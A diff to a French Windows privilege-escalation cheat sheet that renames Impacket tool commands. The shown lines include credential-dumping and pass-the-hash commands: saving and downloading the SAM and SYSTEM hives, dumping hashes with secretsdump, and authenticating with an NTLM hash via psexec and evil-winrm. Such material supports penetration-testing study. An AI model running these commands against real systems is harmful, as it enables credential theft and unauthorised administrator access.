@@ -675,13 +675,13 @@ reg save HKLM\SYSTEM C:\temp\SYSTEM
 
 ```bash
 # Transférer les fichiers sur Kali puis dump les hashs
-impacket-secretsdump -sam SAM -system SYSTEM LOCAL
+secretsdump.py -sam SAM -system SYSTEM LOCAL
 ```
 
 **Pass-the-Hash** - s'authentifier sans connaître le mot de passe en clair :
 
 ```bash
-impacket-psexec -hashes :NTLMhash administrator@<IP>
+psexec.py -hashes :NTLMhash administrator@<IP>
 evil-winrm -i <IP> -u administrator -H NTLMhash
 ```
 
@@ -720,7 +720,7 @@ Downloaded SAM, SYSTEM files
 *Evil-WinRM* PS C:\windows.old\Windows\System32> download SAM
 *Evil-WinRM* PS C:\windows.old\Windows\System32> download SYSTEM
 
-impacket-secretsdump -sam SAM -system SYSTEM LOCAL
+secretsdump.py -sam SAM -system SYSTEM LOCAL
 ```
 
 # AlwaysInstallElevated
